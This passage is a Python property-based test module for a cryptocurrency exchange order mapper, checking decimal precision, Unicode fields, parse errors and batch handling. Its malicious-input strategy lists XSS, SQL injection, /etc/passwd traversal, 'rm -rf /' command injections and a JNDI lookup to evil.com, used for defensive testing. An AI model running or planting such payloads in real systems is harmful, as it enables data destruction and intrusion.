"""Property-based tests for Backpack Trading Data Mapper Robustness.

This module provides comprehensive property-based testing of trading data mapper
robustness that is critical for safe order processing and financial integrity.

SECURITY CRITICAL: Trading data transformation robustness prevents:
- Order execution errors through malformed trade data
- Financial loss through precision errors in order quantities/prices
- System compromise through injection attacks via order parameters
- Memory exhaustion through oversized order processing
- Data corruption through improper encoding/Unicode handling

Key Testing Areas:
- Boundary value handling with extreme financial amounts
- Unicode symbol support for international trading
- Error handling and recovery in transformation failures
- Performance characteristics under high-volume processing
- Data consistency validation across transformation workflows
- Security boundary testing for malicious inputs

Following TESTING_SECURITY_RULES.md:
- NO hardcoded financial values (Hypothesis generates them)
- NO fallback mechanisms that could hide transformation errors
- Comprehensive testing of financial data boundary conditions
- Validation of security-sensitive transformation behaviors

Architecture Compliance:
- Follows RULE-ARCH-MODEL-DESIGN-V2 for trading model transformations
- Implements RULE-RUNTIME-SAFETY-V4 for safe order processing
- Adheres to RULE-NO-SILENCING-V4 for proper transformation error propagation
"""

from __future__ import annotations

import json
from datetime import UTC, datetime, timedelta
from decimal import Decimal
from typing import TYPE_CHECKING, Any

import pytest
from hypothesis import assume, given, settings, strategies as st
from hypothesis.strategies import SearchStrategy, composite

from cyberdelta.config.structlog_config import get_logger
from tests.common_symbols import SOL_USDC_BP


# Third-party imports for type checking only
if TYPE_CHECKING:
    from pytest_mock import MockerFixture

# Project-specific imports
from cyberdelta.apis.backpack.mappers.trading.bp_order_mapper import BackpackOrderMapper
from cyberdelta.apis.backpack.models.bp_raw_order import BackpackRawOrderResponse
from cyberdelta.apis.common import TransformationError
from cyberdelta.core.enums import OrderStatus
from cyberdelta.enums import OrderSide, OrderType, TimeInForce
from cyberdelta.models import Order
from cyberdelta.symbols import exchanges


# Constants for datetime ranges - timezone-aware for ruff compliance
MIN_TEST_DATE_AWARE = datetime(2020, 1, 1, tzinfo=UTC)
MAX_TEST_DATE_AWARE = datetime(2030, 12, 31, tzinfo=UTC)

logger = get_logger(__name__)


# =============================================================================
# HELPER FUNCTIONS FOR HYPOTHESIS STRATEGY BUILDING
# =============================================================================


def _create_financial_decimal(integer: int, decimal: int) -> str:
    """Create financial decimal string from integer and decimal parts.

    Args:
        integer: Integer part of the decimal.
        decimal: Decimal part (6 digits).

    Returns:
        Formatted decimal string.
    """
    return f"{integer}.{decimal:06d}"


def _create_high_precision_decimal(mantissa: int) -> str:
    """Create high precision decimal string.

    Args:
        mantissa: Mantissa value.

    Returns:
        Formatted high precision decimal string.
    """
    return f"{mantissa}.{'123456789012345678901234567890'[:18]}"


def _create_large_number(exp: int) -> str:
    """Create large number string.

    Args:
        exp: Exponent (number of zeros).

    Returns:
        Formatted large number string.
    """
    return f"1{'0' * exp}.0"


def _create_uuid_like_id(a: str, b: str, c: str, d: str) -> str:
    """Create UUID-like ID string.

    Args:
        a: First part of UUID.
        b: Second part of UUID.
        c: Third part of UUID.
        d: Fourth part of UUID.

    Returns:
        Formatted UUID-like string.
    """
    return f"{a}-{b}-{c}-{d}"


def _create_client_id(n: int) -> str:
    """Create client ID string.

    Args:
        n: Client number.

    Returns:
        Formatted client ID string.
    """
    return f"client_{n}"


def _create_symbol(base: str, quote: str) -> str:
    """Create symbol from base and quote currencies.

    Args:
        base: Base currency string.
        quote: Quote currency string.

    Returns:
        Formatted symbol string.
    """
    return f"{base}-{quote}"


def _is_non_empty_text(x: str) -> bool:
    """Check if text is non-empty after stripping.

    Args:
        x: Text to check.

    Returns:
        True if text is non-empty after stripping.
    """
    return bool(x.strip())


def _datetime_to_iso(dt: datetime) -> str:
    """Convert datetime to ISO format string.

    Args:
        dt: Datetime object.

    Returns:
        ISO format datetime string.
    """
    return dt.isoformat()


def _create_concurrent_id(i: int) -> str:
    """Create concurrent operation ID.

    Args:
        i: Operation number.

    Returns:
        Formatted concurrent ID string.
    """
    return f"concurrent_{i}"


def _create_enum_mappings_tuple(
    side: str, order_type: str, status: str, tif: str
) -> tuple[str, str, str, str]:
    """Create enum mappings tuple.

    Args:
        side: Order side string.
        order_type: Order type string.
        status: Order status string.
        tif: Time in force string.

    Returns:
        Tuple of enum strings.
    """
    return (side, order_type, status, tif)


# =============================================================================
# HYPOTHESIS STRATEGIES FOR TRADING DATA ROBUSTNESS TESTING
# =============================================================================


def backpack_order_side_strategy() -> SearchStrategy[str]:
    """Generate valid Backpack order side strings.

    Returns:
        A Hypothesis strategy for order sides.
    """
    return st.one_of([
        st.sampled_from(["Buy", "Sell", "buy", "sell", "BUY", "SELL"]),
        # Unicode variations
        st.sampled_from(["Buy🚀", "Sell💰", "買い", "売り"]),
    ])


def backpack_order_status_strategy() -> SearchStrategy[str]:
    """Generate valid Backpack order status strings.

    Returns:
        A Hypothesis strategy for order statuses.
    """
    return st.one_of([
        st.sampled_from([
            "NEW",
            "FILLED",
            "CANCELLED",
            "REJECTED",
            "PARTIALLY_FILLED",
            "EXPIRED",
            "new",
            "filled",
            "cancelled",
            "rejected",
            "partially_filled",
            "expired",
        ]),
        # Edge case statuses
        st.sampled_from(["PENDING", "UNKNOWN", "ERROR"]),
    ])


def backpack_order_type_strategy() -> SearchStrategy[str]:
    """Generate valid Backpack order type strings.

    Returns:
        A Hypothesis strategy for order types.
    """
    return st.one_of([
        st.sampled_from(["LIMIT", "MARKET", "STOP", "STOP_LIMIT"]),
        st.sampled_from(["limit", "market", "stop", "stop_limit"]),
        # Uncommon order types
        st.sampled_from(["IOC", "FOK", "POST_ONLY"]),
    ])


def backpack_time_in_force_strategy() -> SearchStrategy[str | None]:
    """Generate valid Backpack time in force strings.

    Returns:
        A Hypothesis strategy for time in force values.
    """
    return st.one_of([
        st.sampled_from(["GTC", "IOC", "FOK"]),
        st.sampled_from(["gtc", "ioc", "fok"]),
        # Edge cases
        st.none(),
        st.sampled_from(["DAY", "GTD"]),
    ])


def financial_decimal_string_strategy() -> SearchStrategy[str]:
    """Generate financial decimal strings for robustness testing.

    Returns:
        A Hypothesis strategy for financial decimal strings.
    """
    return st.one_of([
        # Normal values
        st.builds(
            _create_financial_decimal,
            st.integers(min_value=1, max_value=999999),
            st.integers(min_value=0, max_value=999999),
        ),
        # High precision values
        st.builds(
            _create_high_precision_decimal,
            st.integers(min_value=1, max_value=999999999),
        ),
        # Extreme values
        st.just("0.000000000000001"),
        st.just("999999999999999.999999999999999"),
        st.just("21000000.0"),  # Max BTC supply
        # Edge cases
        st.just("0.0"),
        st.just("1.0"),
        # Very large numbers
        st.builds(_create_large_number, st.integers(min_value=6, max_value=15)),
    ])


def order_id_strategy() -> SearchStrategy[str]:
    """Generate order ID strings for testing.

    Returns:
        A Hypothesis strategy for order IDs.
    """
    return st.one_of([
        # Numeric IDs
        st.builds(str, st.integers(min_value=1, max_value=999999999999)),
        # Alphanumeric IDs
        st.text(
            min_size=1,
            max_size=64,
            alphabet=st.characters(whitelist_categories=["Lu", "Ll", "Nd", "Pc"]),
        ),
        # UUID-like IDs
        st.builds(
            _create_uuid_like_id,
            st.text(alphabet="0123456789abcdef", min_size=8, max_size=8),
            st.text(alphabet="0123456789abcdef", min_size=4, max_size=4),
            st.text(alphabet="0123456789abcdef", min_size=4, max_size=4),
            st.text(alphabet="0123456789abcdef", min_size=12, max_size=12),
        ),
        # Unicode IDs
        st.sampled_from(["order_測試_123", "заказ_456", "order_🎯_789"]),
    ])


def client_order_id_strategy() -> SearchStrategy[str | None]:
    """Generate client order ID strings for testing.

    Returns:
        A Hypothesis strategy for client order IDs (can be None).
    """
    return st.one_of([
        st.none(),
        st.text(min_size=1, max_size=64),
        # Proper st.builds usage without .example()
        st.builds(_create_client_id, st.integers(min_value=1, max_value=999999)),
        # Unicode client IDs
        st.sampled_from(["client_測試_123", "клиент_456", "client_🎯_789"]),
    ])


def symbol_strategy() -> SearchStrategy[str]:
    """Generate trading symbol strings for testing.

    Returns:
        A Hypothesis strategy for trading symbols.
    """
    return st.one_of([
        # Common symbols
        st.sampled_from([
            "BTC-USDC",
            "ETH-USDC",
            "SOL-USDC",
            "AVAX-USDC",
            "DOT-USDC",
            "LINK-USDC",
            "UNI-USDC",
            "MATIC-USDC",
            "ADA-USDC",
            "XRP-USDC",
        ]),
        # Generated symbols
        st.builds(
            _create_symbol,
            st.text(
                min_size=2,
                max_size=10,
                alphabet=st.characters(whitelist_categories=["Lu", "Ll", "Nd"]),
            ).filter(_is_non_empty_text),
            st.sampled_from(["USDC", "USDT", "BTC", "ETH"]),
        ),
        # Unicode symbols
        st.sampled_from(["BTC-USDC🚀", "ETH_測試", "SOL-€URO", "DOGE_символ", "ADA_🌟"]),
        # Very long symbols (up to limits)
        st.text(
            min_size=10,
            max_size=32,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_."
            ),
        ),
    ])


def iso_datetime_strategy() -> SearchStrategy[str]:
    """Generate ISO datetime strings for testing.

    Returns:
        A Hypothesis strategy for ISO datetime strings.
    """
    return st.builds(
        _datetime_to_iso,
        st.datetimes(
            min_value=MIN_TEST_DATE_AWARE.replace(tzinfo=None),
            max_value=MAX_TEST_DATE_AWARE.replace(tzinfo=None),
            timezones=st.just(UTC),
        ),
    )


def malicious_input_strategy() -> SearchStrategy[Any]:
    """Generate malicious input strings for security testing.

    Returns:
        A Hypothesis strategy for malicious inputs.
    """
    return st.one_of([
        # XSS attempts
        st.just("<script>alert('xss')</script>"),
        st.just("<img src=x onerror=alert(1)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE orders;--"),
        st.just("1' OR '1'='1"),
        # Path traversal
        st.just("../../../etc/passwd"),
        # Command injection
        st.just("; rm -rf /"),
        st.just("$(rm -rf /)"),
        # Buffer overflow attempts (reasonable size as per feedback)
        st.text(min_size=1000, max_size=2000),
        # Unicode attacks
        st.sampled_from(["\\udce2\\udc28\\udc00", "\\x00\\x01\\x02"]),
        # Format string attacks
        st.just("%s%s%s%s%s"),
        st.just("${jndi:ldap://evil.com/a}"),
        # Invalid decimal formats
        st.just("not_a_number"),
        st.just("1.2.3.4"),
        st.just("..123"),
        st.just("123.."),
        # JSON injection
        st.just('{"malicious": "payload"}'),
    ])


@composite
def backpack_raw_order_strategy(draw: st.DrawFn) -> BackpackRawOrderResponse:
    """Generate valid BackpackRawOrderResponse instances.

    Args:
        draw: Hypothesis draw function

    Returns:
        A BackpackRawOrderResponse instance.
    """
    side = draw(backpack_order_side_strategy())
    status = draw(backpack_order_status_strategy())
    order_type = draw(backpack_order_type_strategy())
    quantity = draw(financial_decimal_string_strategy())
    order_id = draw(order_id_strategy())
    client_id = draw(client_order_id_strategy())
    symbol = draw(symbol_strategy())
    time_in_force = draw(backpack_time_in_force_strategy())
    created_at = draw(iso_datetime_strategy())
    updated_at = draw(iso_datetime_strategy())

    # Generate price based on order type
    price = None if order_type.upper() == "MARKET" else draw(financial_decimal_string_strategy())

    # Generate executed quantity (should be <= quantity for consistency)
    try:
        qty_decimal = Decimal(quantity)
        if qty_decimal > Decimal(0):
            executed_quantity = draw(
                st.builds(str, st.decimals(min_value=Decimal(0), max_value=qty_decimal, places=18))
            )
        else:
            executed_quantity = "0.0"
    except (ValueError, TypeError, OverflowError):
        executed_quantity = "0.0"

    # Generate average fill price if there's execution
    try:
        if Decimal(executed_quantity) > Decimal(0) and price is not None:
            avg_fill_price = price
        else:
            avg_fill_price = None
    except (ValueError, TypeError, OverflowError):
        avg_fill_price = None

    # Generate trigger price for STOP orders
    if order_type.upper() in ["STOP", "STOP_LIMIT"]:
        trigger_price = draw(financial_decimal_string_strategy())
    else:
        trigger_price = None

    return BackpackRawOrderResponse(
        id=order_id,
        clientId=client_id,
        relatedOrderId=None,
        symbol=symbol,
        side=side,
        orderType=order_type,
        status=status,
        quantity=quantity,
        executedQuantity=executed_quantity,
        executedQuoteQuantity=None,
        price=price,
        triggerPrice=trigger_price,
        avgFillPrice=avg_fill_price,
        triggerBy=None,
        timeInForce=time_in_force,
        reduceOnly=False,
        postOnly=False,
        selfTradePrevention=None,
        createdAt=created_at,
        updatedAt=updated_at,
        triggeredAt=None,
        expiryReason=None,
        origin=None,
    )


# =============================================================================
# PYTEST FIXTURES
# =============================================================================


@pytest.fixture
def trading_data_mapper() -> BackpackOrderMapper:
    """Provide an instance of BackpackOrderMapper.

    Returns:
        BackpackOrderMapper instance for testing
    """
    return BackpackOrderMapper()


# =============================================================================
# PROPERTY TESTS FOR BOUNDARY VALUE HANDLING
# =============================================================================


class TestTradingDataTransformationRobustnessProperties:
    """Property-based tests for trading data transformation robustness."""

    @given(raw_order=backpack_raw_order_strategy())
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_order_transformation_preserves_essential_data(
        self, raw_order: BackpackRawOrderResponse, trading_data_mapper: BackpackOrderMapper
    ) -> None:
        """Property: Order transformation should preserve all essential trading data."""
        # Skip invalid decimal values
        try:
            if raw_order.quantity is None:
                assume(False)
            # DEFENSIVE CHECK: quantity validated as not None above
            assert raw_order.quantity is not None
            quantity_decimal = Decimal(raw_order.quantity)
            if quantity_decimal <= Decimal(0):
                assume(False)
            if raw_order.price is not None:
                Decimal(raw_order.price)
            if raw_order.executedQuantity is not None:
                exec_qty = Decimal(raw_order.executedQuantity)
                if exec_qty < Decimal(0) or exec_qty > quantity_decimal:
                    assume(False)
        except (ValueError, TypeError, OverflowError):
            assume(False)

        result = trading_data_mapper.transform_raw_order_to_internal(raw_order)

        # Property: Result should be valid Order instance
        assert isinstance(result, Order)

        # Property: Essential fields should be preserved
        assert result.exchange_order_id == raw_order.id
        assert result.symbol.value == raw_order.symbol
        assert raw_order.quantity is not None  # Validated above
        assert result.quantity_requested == Decimal(raw_order.quantity)

        # Property: Side should be correctly mapped
        expected_side = (
            OrderSide.BUY if raw_order.side.upper() in ["BUY", "Buy"] else OrderSide.SELL
        )
        assert result.side == expected_side

        # Property: Client order ID should be preserved or generated
        if raw_order.clientId is not None and raw_order.clientId.strip():
            assert result.client_order_id == raw_order.clientId
        else:
            assert result.client_order_id is not None
            assert len(result.client_order_id) > 0

    @given(
        extreme_quantity=st.one_of([
            st.just("0.000000000000001"),  # Extremely small
            st.just("999999999999999.999999999999999"),  # Extremely large
            st.just("21000000.0"),  # Max BTC supply
            financial_decimal_string_strategy(),  # Random values
        ]),
        extreme_price=st.one_of([
            st.just("0.000000000000001"),  # Extremely small
            st.just("999999999999999.999999999999999"),  # Extremely large
            financial_decimal_string_strategy(),  # Random values
        ]),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_extreme_value_handling(
        self, extreme_quantity: str, extreme_price: str, trading_data_mapper: BackpackOrderMapper
    ) -> None:
        """Property: Transformation should handle extreme financial values safely."""
        # Skip invalid values
        try:
            qty_decimal = Decimal(extreme_quantity)
            price_decimal = Decimal(extreme_price)
            if qty_decimal <= Decimal(0) or price_decimal <= Decimal(0):
                assume(False)
        except (ValueError, TypeError, OverflowError):
            assume(False)

        raw_order = BackpackRawOrderResponse(
            id="extreme_test",
            clientId="test_client",
            relatedOrderId=None,
            symbol="BTC-USDC",
            side="Buy",
            orderType="LIMIT",
            status="NEW",
            quantity=extreme_quantity,
            executedQuantity="0.0",
            executedQuoteQuantity=None,
            price=extreme_price,
            triggerPrice=None,
            avgFillPrice=None,
            triggerBy=None,
            timeInForce="GTC",
            reduceOnly=False,
            postOnly=False,
            selfTradePrevention=None,
            createdAt=datetime.now(UTC).isoformat(),
            updatedAt=datetime.now(UTC).isoformat(),
            triggeredAt=None,
            expiryReason=None,
            origin=None,
        )

        result = trading_data_mapper.transform_raw_order_to_internal(raw_order)

        # Property: Extreme values should be preserved exactly
        assert result.quantity_requested == Decimal(extreme_quantity)
        if result.price is not None:
            assert result.price == Decimal(extreme_price)

        # Property: Order should still be valid
        assert isinstance(result, Order)
        assert result.exchange_order_id == "extreme_test"

    @given(
        precision_scenario=st.builds(
            _create_high_precision_decimal,
            st.integers(min_value=1, max_value=999999),
        )
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_decimal_precision_preservation(
        self, precision_scenario: str, trading_data_mapper: BackpackOrderMapper
    ) -> None:
        """Property: Decimal precision should be preserved in financial calculations."""
        raw_order = BackpackRawOrderResponse(
            id="precision_test",
            clientId="test_client",
            relatedOrderId=None,
            symbol="BTC-USDC",
            side="Buy",
            orderType="LIMIT",
            status="NEW",
            quantity=precision_scenario,
            executedQuantity="0.0",
            executedQuoteQuantity=None,
            price=precision_scenario,
            triggerPrice=None,
            avgFillPrice=None,
            triggerBy=None,
            timeInForce="GTC",
            reduceOnly=False,
            postOnly=False,
            selfTradePrevention=None,
            createdAt=datetime.now(UTC).isoformat(),
            updatedAt=datetime.now(UTC).isoformat(),
            triggeredAt=None,
            expiryReason=None,
            origin=None,
        )

        result = trading_data_mapper.transform_raw_order_to_internal(raw_order)

        # Property: Precision should be maintained within Decimal limits
        expected_decimal = Decimal(precision_scenario)
        assert result.quantity_requested == expected_decimal
        if result.price is not None:
            assert result.price == expected_decimal

    @given(
        unicode_symbol=st.sampled_from([
            "BTC-USDC🚀",
            "ETH_測試",
            "SOL-€URO",
            "DOGE_символ",
            "ADA_🌟",
            "test_🎯_symbol",
            "символ_торговли",
            "取引_ペア",
        ]),
        unicode_client_id=st.sampled_from([
            "client_測試_123",
            "заказ_456",
            "order_🎯_789",
            "commande_été_001",
        ]),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_unicode_support_comprehensive(
        self, unicode_symbol: str, unicode_client_id: str, trading_data_mapper: BackpackOrderMapper
    ) -> None:
        """Property: Unicode characters should be handled correctly in all fields."""
        raw_order = BackpackRawOrderResponse(
            id=f"order_{len(unicode_symbol)}",
            clientId=unicode_client_id,
            relatedOrderId=None,
            symbol=unicode_symbol,
            side="Buy",
            orderType="LIMIT",
            status="NEW",
            quantity="1.0",
            executedQuantity="0.0",
            executedQuoteQuantity=None,
            price="100.0",
            triggerPrice=None,
            avgFillPrice=None,
            triggerBy=None,
            timeInForce="GTC",
            reduceOnly=False,
            postOnly=False,
            selfTradePrevention=None,
            createdAt=datetime.now(UTC).isoformat(),
            updatedAt=datetime.now(UTC).isoformat(),
            triggeredAt=None,
            expiryReason=None,
            origin=None,
        )

        result = trading_data_mapper.transform_raw_order_to_internal(raw_order)

        # Property: Unicode should be preserved exactly
        assert result.symbol.value == unicode_symbol
        assert result.client_order_id == unicode_client_id
        assert result.exchange_order_id == f"order_{len(unicode_symbol)}"

        # Property: Should be JSON serializable
        json.dumps({
            "symbol": result.symbol.value,
            "client_id": result.client_order_id,
            "order_id": result.exchange_order_id,
        })


# =============================================================================
# PROPERTY TESTS FOR ERROR HANDLING AND RECOVERY
# =============================================================================


class TestTradingDataErrorHandlingProperties:
    """Property-based tests for error handling and recovery scenarios."""

    @given(
        malicious_field=malicious_input_strategy(),
        field_type=st.sampled_from(["symbol", "client_id", "order_id", "side", "status"]),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_malicious_input_resistance(
        self, malicious_field: object, field_type: str, trading_data_mapper: BackpackOrderMapper
    ) -> None:
        """Property: Transformation should resist malicious inputs across all fields."""
        if not isinstance(malicious_field, str):
            malicious_field = str(malicious_field)

        # Create base order data
        base_data = {
            "symbol": "BTC-USDC",
            "client_id": "test_client",
            "order_id": "test_order",
            "side": "Buy",
            "status": "NEW",
        }

        # Inject malicious data into specified field
        base_data[field_type] = malicious_field

        raw_order = BackpackRawOrderResponse(
            id=base_data["order_id"],
            clientId=base_data["client_id"],
            relatedOrderId=None,
            symbol=base_data["symbol"],
            side=base_data["side"],
            orderType="LIMIT",
            status=base_data["status"],
            quantity="1.0",
            executedQuantity="0.0",
            executedQuoteQuantity=None,
            price="100.0",
            triggerPrice=None,
            avgFillPrice=None,
            triggerBy=None,
            timeInForce="GTC",
            reduceOnly=False,
            postOnly=False,
            selfTradePrevention=None,
            createdAt=datetime.now(UTC).isoformat(),
            updatedAt=datetime.now(UTC).isoformat(),
            triggeredAt=None,
            expiryReason=None,
            origin=None,
        )

        try:
            result = trading_data_mapper.transform_raw_order_to_internal(raw_order)

            # If transformation succeeds, should not execute malicious content
            result_str = str(result)
            assert "<script>" not in result_str
            assert "DROP TABLE" not in result_str
            assert "rm -rf" not in result_str

            # Should not leak sensitive information
            assert "password" not in result_str.lower()
            assert "secret" not in result_str.lower()

        except (TransformationError, ValueError):
            # Rejection is acceptable for malicious inputs
            pass

    @given(
        parsing_error_scenario=st.sampled_from(["decimal_error", "datetime_error", "both_errors"])
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_parsing_error_handling_consistency(
        self,
        parsing_error_scenario: str,
        trading_data_mapper: BackpackOrderMapper,
        mocker: MockerFixture,
    ) -> None:
        """Property: Parsing errors should be handled consistently with clear error messages."""
        raw_order = BackpackRawOrderResponse(
            id="error_test",
            clientId="test_client",
            relatedOrderId=None,
            symbol="BTC-USDC",
            side="Buy",
            orderType="LIMIT",
            status="NEW",
            quantity="1.0",
            executedQuantity="0.0",
            executedQuoteQuantity=None,
            price="100.0",
            triggerPrice=None,
            avgFillPrice=None,
            triggerBy=None,
            timeInForce="GTC",
            reduceOnly=False,
            postOnly=False,
            selfTradePrevention=None,
            createdAt=datetime.now(UTC).isoformat(),
            updatedAt=datetime.now(UTC).isoformat(),
            triggeredAt=None,
            expiryReason=None,
            origin=None,
        )

        # Mock parsing functions based on scenario
        if parsing_error_scenario == "decimal_error":
            mock_decimal = mocker.patch(
                "cyberdelta.apis.backpack.mappers.trading.bp_order_mapper.parse_decimal_safely"
            )
            mock_decimal.side_effect = ValueError("Invalid decimal format")
        elif parsing_error_scenario == "datetime_error":
            mock_datetime = mocker.patch(
                "cyberdelta.apis.backpack.mappers.trading.bp_order_mapper.parse_datetime_utc"
            )
            mock_datetime.side_effect = ValueError("Invalid datetime format")
        elif parsing_error_scenario == "both_errors":
            mock_decimal = mocker.patch(
                "cyberdelta.apis.backpack.mappers.trading.bp_order_mapper.parse_decimal_safely"
            )
            mock_datetime = mocker.patch(
                "cyberdelta.apis.backpack.mappers.trading.bp_order_mapper.parse_datetime_utc"
            )
            mock_decimal.side_effect = ValueError("Decimal parsing error")
            mock_datetime.side_effect = ValueError("Datetime parsing error")

        # Property: Should raise TransformationError with clear message
        with pytest.raises(TransformationError) as exc_info:
            trading_data_mapper.transform_raw_order_to_internal(raw_order)

        error_message = str(exc_info.value)
        # Property: Error message should include order ID
        assert "error_test" in error_message
        # Property: Error message should be informative
        assert len(error_message) > 10

    @given(
        invalid_field_values=st.dictionaries(
            st.sampled_from(["quantity", "price", "executedQuantity"]),
            st.sampled_from(["invalid", "not_a_number", "1.2.3.4", "..123", "123..", ""]),
            min_size=1,
            max_size=3,
        )
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_invalid_decimal_field_handling(
        self, invalid_field_values: dict[str, str], trading_data_mapper: BackpackOrderMapper
    ) -> None:
        """Property: Invalid decimal fields should be handled gracefully with proper errors."""
        # Create base order with valid defaults
        order_data = {
            "id": "invalid_test",
            "clientId": "test_client",
            "relatedOrderId": None,
            "symbol": "BTC-USDC",
            "side": "Buy",
            "orderType": "LIMIT",
            "status": "NEW",
            "quantity": "1.0",
            "executedQuantity": "0.0",
            "executedQuoteQuantity": None,
            "price": "100.0",
            "triggerPrice": None,
            "avgFillPrice": None,
            "triggerBy": None,
            "timeInForce": "GTC",
            "reduceOnly": False,
            "postOnly": False,
            "selfTradePrevention": None,
            "createdAt": datetime.now(UTC).isoformat(),
            "updatedAt": datetime.now(UTC).isoformat(),
            "triggeredAt": None,
            "expiryReason": None,
            "origin": None,
        }

        # Inject invalid values
        order_data.update(invalid_field_values)

        raw_order = BackpackRawOrderResponse.model_validate(order_data)

        # Property: Should raise TransformationError for invalid decimal fields
        with pytest.raises(TransformationError):
            trading_data_mapper.transform_raw_order_to_internal(raw_order)


# =============================================================================
# PROPERTY TESTS FOR PERFORMANCE AND MEMORY EFFICIENCY
# =============================================================================


class TestTradingDataPerformanceProperties:
    """Property-based tests for performance and memory efficiency."""

    @given(
        batch_size=st.integers(min_value=10, max_value=100),
        order_variation=st.sampled_from(["identical", "varied", "extreme"]),
    )
    @settings(max_examples=20, deadline=timedelta(seconds=1))
    def test_batch_transformation_efficiency(
        self, batch_size: int, order_variation: str, trading_data_mapper: BackpackOrderMapper
    ) -> None:
        """Property: Batch transformations should be efficient and consistent."""
        orders: list[BackpackRawOrderResponse] = []

        for i in range(batch_size):
            if order_variation == "identical":
                # All orders identical
                order_id = "order_001"
                symbol = "BTC-USDC"
                quantity = "1.0"
                price = "50000.0"
            elif order_variation == "varied":
                # Varied but reasonable orders
                order_id = f"order_{i:03d}"
                symbol = f"SYMBOL{i % 5}_USDC"
                quantity = f"{max(0.1, i * 0.1):.1f}"
                price = f"{1000 + i * 0.1:.1f}"
            else:  # extreme
                # Extreme but valid orders
                order_id = f"extreme_{i}"
                symbol = f"EXTREME{i}_USDC"
                quantity = f"{max(0.000001, i * 0.000001):.6f}"
                price = f"{max(0.01, i * 1000):.2f}"

            raw_order = BackpackRawOrderResponse(
                id=order_id,
                clientId=f"client_{i}",
                relatedOrderId=None,
                symbol=symbol,
                side="Buy",
                orderType="LIMIT",
                status="NEW",
                quantity=quantity,
                executedQuantity="0.0",
                executedQuoteQuantity=None,
                price=price,
                triggerPrice=None,
                avgFillPrice=None,
                triggerBy=None,
                timeInForce="GTC",
                reduceOnly=False,
                postOnly=False,
                selfTradePrevention=None,
                createdAt=datetime.now(UTC).isoformat(),
                updatedAt=datetime.now(UTC).isoformat(),
                triggeredAt=None,
                expiryReason=None,
                origin=None,
            )
            orders.append(raw_order)

        # Transform all orders
        results: list[Order] = []
        for order in orders:
            result = trading_data_mapper.transform_raw_order_to_internal(order)
            results.append(result)

        # Property: All orders should be transformed successfully
        assert len(results) == batch_size

        # Property: All results should be valid Order instances
        for result in results:
            assert isinstance(result, Order)
            assert result.exchange_order_id is not None
            assert result.symbol is not None
            assert result.quantity_requested > Decimal(0)

    @given(
        large_string_field=st.text(min_size=100, max_size=1000),  # Reasonable size per feedback
        field_type=st.sampled_from(["order_id", "client_id", "symbol"]),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_large_string_field_handling(
        self, large_string_field: str, field_type: str, trading_data_mapper: BackpackOrderMapper
    ) -> None:
        """Property: Large string fields should be handled efficiently without memory issues."""
        # Create order with large string in specified field
        order_data = {"id": "normal_id", "clientId": "normal_client", "symbol": "BTC-USDC"}
        order_data[field_type] = large_string_field

        raw_order = BackpackRawOrderResponse(
            id=order_data["id"],
            clientId=order_data["clientId"],
            relatedOrderId=None,
            symbol=order_data["symbol"],
            side="Buy",
            orderType="LIMIT",
            status="NEW",
            quantity="1.0",
            executedQuantity="0.0",
            executedQuoteQuantity=None,
            price="100.0",
            triggerPrice=None,
            avgFillPrice=None,
            triggerBy=None,
            timeInForce="GTC",
            reduceOnly=False,
            postOnly=False,
            selfTradePrevention=None,
            createdAt=datetime.now(UTC).isoformat(),
            updatedAt=datetime.now(UTC).isoformat(),
            triggeredAt=None,
            expiryReason=None,
            origin=None,
        )

        try:
            result = trading_data_mapper.transform_raw_order_to_internal(raw_order)

            # Property: Large strings should be handled without memory issues
            assert isinstance(result, Order)

            # Property: String content should be preserved
            if field_type == "order_id":
                assert result.exchange_order_id == large_string_field
            elif field_type == "client_id":
                assert result.client_order_id == large_string_field
            elif field_type == "symbol":
                assert result.symbol.value == large_string_field

        except (TransformationError, MemoryError, ValueError):
            # Memory protection or validation rejection is acceptable
            pass

    @given(
        concurrent_orders=st.lists(
            st.builds(_create_concurrent_id, st.integers(min_value=1, max_value=50)),
            min_size=5,
            max_size=20,
            unique=True,
        )
    )
    @settings(max_examples=30, deadline=timedelta(seconds=1))
    def test_concurrent_transformation_safety(
        self, concurrent_orders: list[str], trading_data_mapper: BackpackOrderMapper
    ) -> None:
        """Property: Concurrent transformations should be safe and not interfere."""
        results: list[tuple[str, Order]] = []

        for order_id in concurrent_orders:
            raw_order = BackpackRawOrderResponse(
                id=order_id,
                clientId=f"client_{order_id}",
                relatedOrderId=None,
                symbol="BTC-USDC",
                side="Buy",
                orderType="LIMIT",
                status="NEW",
                quantity="1.0",
                executedQuantity="0.0",
                executedQuoteQuantity=None,
                price="100.0",
                triggerPrice=None,
                avgFillPrice=None,
                triggerBy=None,
                timeInForce="GTC",
                reduceOnly=False,
                postOnly=False,
                selfTradePrevention=None,
                createdAt=datetime.now(UTC).isoformat(),
                updatedAt=datetime.now(UTC).isoformat(),
                triggeredAt=None,
                expiryReason=None,
                origin=None,
            )

            result = trading_data_mapper.transform_raw_order_to_internal(raw_order)
            results.append((order_id, result))

        # Property: No cross-contamination between transformations
        for order_id, result in results:
            assert result.exchange_order_id == order_id
            assert result.client_order_id == f"client_{order_id}"

        # Property: All results should be unique
        order_ids = [result.exchange_order_id for _, result in results]
        assert len(set(order_ids)) == len(concurrent_orders)


# =============================================================================
# PROPERTY TESTS FOR DATA CONSISTENCY AND VALIDATION
# =============================================================================


class TestTradingDataConsistencyProperties:
    """Property-based tests for data consistency and validation."""

    @given(
        status_mapping=st.sampled_from([
            ("NEW", OrderStatus.OPEN),
            ("FILLED", OrderStatus.FILLED),
            ("CANCELLED", OrderStatus.CANCELED),
            ("REJECTED", OrderStatus.REJECTED),
            ("PARTIALLY_FILLED", OrderStatus.PARTIALLY_FILLED),
            ("EXPIRED", OrderStatus.UNKNOWN),
            # Case variations
            ("new", OrderStatus.OPEN),
            ("filled", OrderStatus.FILLED),
            ("cancelled", OrderStatus.CANCELED),
        ])
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_status_mapping_consistency_property(
        self, status_mapping: tuple[str, OrderStatus], trading_data_mapper: BackpackOrderMapper
